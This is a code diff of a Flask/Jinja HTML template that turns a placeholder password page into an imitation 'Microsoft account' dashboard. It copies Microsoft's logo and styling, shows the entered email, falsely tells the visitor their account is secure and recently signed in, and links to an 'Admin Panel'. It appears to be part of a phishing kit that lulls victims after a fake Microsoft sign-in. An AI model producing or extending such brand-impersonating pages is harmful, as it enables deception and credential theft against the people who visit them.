@@ -2,26 +2,274 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Redirecting...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft account</title>
     <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <style>
+        body {
+            background: #f3f3f3;
+            font-family: 'Segoe UI', sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* ── Top Nav ── */
+        .ms-nav {
+            background: #fff;
+            border-bottom: 1px solid #e0e0e0;
+            padding: 12px 30px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .ms-nav .nav-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .ms-nav .nav-left span {
+            font-size: 16px;
+            font-weight: 600;
+            color: #1b1b1b;
+        }
+
+        .ms-nav .nav-right {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .ms-nav .nav-right .avatar-circle {
+            width: 34px;
+            height: 34px;
+            border-radius: 50%;
+            background: #0067b8;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        /* ── Dashboard ── */
+        .dashboard {
+            max-width: 900px;
+            margin: 30px auto;
+            padding: 0 20px;
+        }
+
+        .welcome {
+            font-size: 22px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 6px;
+        }
+
+        .welcome-sub {
+            font-size: 13px;
+            color: #555;
+            margin-bottom: 24px;
+        }
+
+        /* ── Cards Grid ── */
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+            gap: 16px;
+        }
+
+        .dash-card {
+            background: #fff;
+            border: 1px solid #e0e0e0;
+            border-radius: 4px;
+            padding: 20px;
+        }
+
+        .dash-card h3 {
+            font-size: 14px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 10px;
+            border-bottom: 1px solid #f0f0f0;
+            padding-bottom: 10px;
+        }
+
+        .dash-card p {
+            font-size: 13px;
+            color: #555;
+            margin-bottom: 6px;
+        }
+
+        .dash-card a {
+            font-size: 13px;
+            color: #0067b8;
+            text-decoration: none;
+        }
+
+        .dash-card a:hover {
+            text-decoration: underline;
+        }
+
+        .dash-card .icon {
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+
+        .security-badge {
+            display: inline-block;
+            background: #dff6dd;
+            color: #107c10;
+            font-size: 11px;
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            color: #555;
+            padding: 6px 0;
+            border-bottom: 1px solid #f5f5f5;
+        }
+
+        .info-row:last-child {
+            border-bottom: none;
+        }
+
+        .info-row span:last-child {
+            color: #1b1b1b;
+            font-weight: 500;
+        }
+
+        /* ── Signout ── */
+        .signout-bar {
+            text-align: center;
+            margin-top: 30px;
+            padding-bottom: 30px;
+        }
+
+        .signout-bar a {
+            font-size: 13px;
+            color: #0067b8;
+            text-decoration: none;
+        }
+
+        .signout-bar a:hover {
+            text-decoration: underline;
+        }
+    </style>
 </head>
 <body>
-    <div class="wrapper">
-        <div class="card" style="text-align:center; padding: 40px;">
-            <div class="ms-logo" style="justify-content:center; margin-bottom:20px;">
-                <svg width="21" height="21" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
-                    <rect x="1" y="1" width="9" height="9" fill="#f25022"/>
-                    <rect x="11" y="1" width="9" height="9" fill="#7fba00"/>
-                    <rect x="1" y="11" width="9" height="9" fill="#00a4ef"/>
-                    <rect x="11" y="11" width="9" height="9" fill="#ffb900"/>
-                </svg>
-                <span>Microsoft</span>
-            </div>
-            <h2 style="font-size:20px; color:#1b1b1b; margin-bottom:10px;">Enter your password</h2>
-            <p style="font-size:13px; color:#555;">Password page coming soon...</p>
-            <br>
-            <a href="/" style="color:#0067b8; font-size:13px;">← Back to Sign in</a>
+
+    <!-- Top Nav -->
+    <div class="ms-nav">
+        <div class="nav-left">
+            <svg width="21" height="21" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
+                <rect x="1" y="1" width="9" height="9" fill="#f25022"/>
+                <rect x="11" y="1" width="9" height="9" fill="#7fba00"/>
+                <rect x="1" y="11" width="9" height="9" fill="#00a4ef"/>
+                <rect x="11" y="11" width="9" height="9" fill="#ffb900"/>
+            </svg>
+            <span>Microsoft account</span>
+        </div>
+        <div class="nav-right">
+            <div class="avatar-circle">{{ email[0]|upper if email else 'U' }}</div>
         </div>
     </div>
+
+    <!-- Dashboard -->
+    <div class="dashboard">
+
+        <p class="welcome">Good day, {{ email }}</p>
+        <p class="welcome-sub">Manage your account info, settings, privacy, and security.</p>
+
+        <div class="grid">
+
+            <!-- Your Info -->
+            <div class="dash-card">
+                <div class="icon">👤</div>
+                <h3>Your info</h3>
+                <div class="info-row">
+                    <span>Email</span>
+                    <span>{{ email }}</span>
+                </div>
+                <div class="info-row">
+                    <span>Account type</span>
+                    <span>Microsoft account</span>
+                </div>
+                <div class="info-row">
+                    <span>Country</span>
+                    <span>Nigeria</span>
+                </div>
+                <br>
+                <a href="#">Edit your info →</a>
+            </div>
+
+            <!-- Security -->
+            <div class="dash-card">
+                <div class="icon">🔒</div>
+                <h3>Security</h3>
+                <span class="security-badge">✓ Account is secure</span>
+                <p>Your account has no security issues.</p>
+                <p>Last signed in: just now</p>
+                <br>
+                <a href="#">View security dashboard →</a>
+            </div>
+
+            <!-- Subscriptions -->
+            <div class="dash-card">
+                <div class="icon">⭐</div>
+                <h3>Subscriptions</h3>
+                <p>Microsoft 365</p>
+                <p style="color:#107c10; font-size:12px;">● Active</p>
+                <br>
+                <a href="#">Manage subscriptions →</a>
+            </div>
+
+            <!-- Devices -->
+            <div class="dash-card">
+                <div class="icon">💻</div>
+                <h3>Devices</h3>
+                <p>Windows PC</p>
+                <p style="font-size:12px; color:#888;">Last active: just now</p>
+                <br>
+                <a href="#">Manage devices →</a>
+            </div>
+
+            <!-- Privacy -->
+            <div class="dash-card">
+                <div class="icon">🛡️</div>
+                <h3>Privacy</h3>
+                <p>Review your privacy settings and activity data.</p>
+                <br>
+                <a href="#">View privacy dashboard →</a>
+            </div>
+
+            <!-- Payment -->
+            <div class="dash-card">
+                <div class="icon">💳</div>
+                <h3>Payment methods</h3>
+                <p>No payment methods on file.</p>
+                <br>
+                <a href="#">Add a payment method →</a>
+            </div>
+
+        </div>
+
+        <div class="signout-bar">
+            <a href="/">← Sign out</a>
+            &nbsp;&nbsp;|&nbsp;&nbsp;
+            <a href="/admin">Admin Panel</a>
+        </div>
+
+    </div>
+
 </body>
 </html>
